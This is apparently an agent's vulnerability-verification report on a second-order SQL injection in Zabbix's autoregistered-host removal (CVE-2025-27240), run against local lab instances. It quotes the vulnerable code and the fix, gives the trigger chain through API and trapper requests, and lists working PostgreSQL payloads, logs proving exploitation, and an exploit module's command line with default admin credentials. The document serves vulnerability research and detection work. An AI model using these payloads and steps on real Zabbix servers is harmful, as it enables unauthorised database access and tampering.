# CVE-2025-27240 (ZBX-26986) — secondary-order SQL injection in autoregistered-host removal

Date: 2026-10-28
Operator: Backlog27240 agent
Repo: /home/alex/zabbix_big_project

## Summary

A Zabbix Server **administrator** can execute arbitrary SQL when an autoregistration
action with the **"Remove host"** operation removes a host whose **Visible name**
(`hosts.name`, `h.name`) contains a SQL payload. The visible name is spliced into a
DELETE statement **without escaping**:

```c
/* src/zabbix_server/operations.c — op_host_del() (6.0.x, 6.4.x, 7.0.0–7.0.3) */
...
if (0 == (hostid = select_discovered_host(event, &hostname)))   /* hostname = h.name (VISIBLE NAME) */
    goto out;
...
DBexecute("delete from autoreg_host where host='%s'", hostname);  /* <-- INJECTION */
```

`select_discovered_host()` (same file) for an autoregistration event
(`EVENT_SOURCE_AUTOREGISTRATION` + `EVENT_OBJECT_ZABBIX_ACTIVE`) runs

```sql
select h.hostid,h.name from hosts h,autoreg_host a
 where h.host=a.host and a.autoreg_hostid=<event.objectid>
   and h.status in (0,1)
```

so the second column returned (`h.name`) is the **admin-controlled visible name**.

## Fix (confirms the exact line)

Commit `6416019f3117` `........S. [DEV-3902] fixed possibility of SQL injection when`
`deleteing autoregistered host` (2024-08-07, backported to 6.0/6.4/7.0):

```diff
- char *hostname = NULL;
+ char *hostname = NULL, *hostname_esc;
...
- DBexecute("delete from autoreg_host where host='%s'", hostname);
+ hostname_esc = DBdyn_escape_string(hostname);
+ DBexecute("delete from autoreg_host where host='%s'", hostname_esc);
```

Fixed versions: **6.0.34, 6.4.19, 7.0.4**. Workaround (per ZBX-26986): disable
autoregistration actions that remove hosts.

## Trigger chain (secondary order)

1. ADM creates host via API: `host.create` with `name = <payload>` (visible name accepts
   arbitrary text incl. quotes — verified live).
2. ADM creates/uses an autoregistration action (`eventsource: 2`) whose operation list
   contains **"Remove host"** (`operationtype: 3`). Operations execute in `operationid`
   order (`order by o.operationid`, actions.c `execute_operations()`).
3. A trapper request re-registers the host: `{"request":"active checks","host":"<name>",
   "host_metadata":"<changed>"}` on server port 10051. A changed/absent `autoreg_host`
   row forces a fresh autoregistration event
   (`zbx_autoreg_flush_hosts_server` → `zbx_add_event(... AUTOREGISTRATION,
   ZABBIX_ACTIVE, autoreg_hostid ...)`).
4. The event matches the action; `op_host_del()` runs:
   - `select_discovered_host()` returns `h.name` = payload,
   - `DBdelete_hosts_with_prototypes()` attempts host removal,
   - `delete from autoreg_host where host='<payload>'` executes the payload **as SQL**.

Single-line payload shape (PostgreSQL):

```
visible name = zpx'||(SELECT pg_sleep(N))||'x        ->  delete from autoreg_host where host='zpx'||(SELECT pg_sleep(N))||'x'
visible name = zpx'||CAST('<marker>' AS int)||'x    ->  invalid input syntax for type integer: "<marker>"  (error oracle)
```

## Live lab evidence

Both lab targets are PostgreSQL-backed and in the affected range.

### 7.0.0 (`zlab_7_0_0_*`, web 127.0.0.1:47467, trapper 127.0.0.1:44646)

Error-based (server log, `[Z3005]`):

```
20261028:152237.339 [Z3005] query failed: [0] PGRES_FATAL_ERROR:ERROR:  invalid input syntax for type integer: "ZBX27240"
LINE 1: delete from autoreg_host where host='zpx'||CAST('ZBX27240' ...
 [delete from autoreg_host where host='zpx'||CAST('ZBX27240' AS int)||'x']
```

Time-based (observed in `pg_stat_activity` on the DB container while active):

```
 pid | state  | query
 111 | active | delete from autoreg_host where host='zpx'||(SELECT pg_sleep(12))||'x'
```

The escalation executes synchronously enough that the **trigger's own socket latency**
reflects the sleep: a `pg_sleep(8)` payload made the active-checks request answer in
**13.02 s** (~5 s registration/escalation baseline + 8 s sleep); the host was removed as
a side effect. Module run against this target: `ok: True, sleep_seen: True, attempts: 1,
elapsed: 13.02`.

### 6.0.27 (`zlab_6_0_27_*`, web 127.0.0.1:45495, trapper 127.0.0.1:44645)

Error-based (server log):

```
20261028:152813.639 [Z3005] query failed: [0] PGRES_FATAL_ERROR:ERROR:  invalid input syntax for type integer: "ZBX27604B"
LINE 1: delete from autoreg_host where host='zpx'||CAST('ZBX27604B' ...
 [delete from autoreg_host where host='zpx'||CAST('ZBX27604B' AS int)||'x']
```

Notes: on 6.0.27 the operation escalated asynchronously (~60 s config-cache
`CacheUpdateFrequency`; `action.create` must propagate); the host-removal step
(`DBlock_hostids` FOR UPDATE lock) was skipped under the concurrent DB load of another
lab run, but the injected DELETE still executed — so host removal is a weak signal and
the **query error / sleep timing is the reliable evidence channel**. Vulnerable code in
`/tmp/zbx6027` is byte-identical to the fixed-diff context.

## Exploit module

`zbxscan/exploits/modules/misc.py::Cve202527240` (registered `CVE-2025-27240`):

- `check()` — affected range gate (6.0.0–<6.0.34, 6.4.0–<6.4.19, 7.0.0–<7.0.4).
- `run()` — needs API creds + trapper port:
  1. `host.create` a fresh host whose **visible name** = payload (`db-flavor`
     postgres|mysql; `--sleep N` / `--marker M`; mode `sleep` (default) | `error`);
  2. `action.create` (eventsource=2) with the **Remove host** operation;
  3. trapper trigger `{"request":"active checks","host":...,"host_metadata":...}`
     (changed metadata forces a new autoregistration event);
  4. detect: sleep mode = trigger latency ≥ 0.7·N (proven 13.02 s vs 8 s live);
     error mode = operation executed (host removed; injection query shown) and the
     `[Z3005]` log line with the marker is the conclusive server-side evidence.
- cleanup: host + action deleted in `finally` (lab hygiene).
- CLI: `zscan -m active -t <target> -exp CVE-2025-27240 --user Admin --password zabbix
  --trap-port <mapped> [--sleep N|--payload error|--marker M|--db-flavor postgres|mysql|--max-wait S]`

Verified result matrix (both exploits live, post-auth admin):

| target | payload | evidence | result |
|---|---|---|---|
| 7.0.0-alpine (PG) | `'x\|CAST('ZBX27240' AS int)` | `[Z3005]` log showing injected DELETE | exploited |
| 7.0.0-alpine (PG) | `'x\|(SELECT pg_sleep(12))` | `pg_stat_activity` active query 12 s | exploited |
| 7.0.0-alpine (PG) | module `--sleep 8` | 13.02 s trigger latency, host removed | exploited |
| 6.0.27-alpine (PG) | `'x\|CAST('ZBX27604B' AS int)` | `[Z3005]` log showing injected DELETE | exploited |

## Build/repo

- `scripts/build_db.py` VERIFIED entry `CVE-2025-27240` added (exploited ×2);
  `build_db.py` rerun → `db/vulns.json` / `db/verifications.json` updated.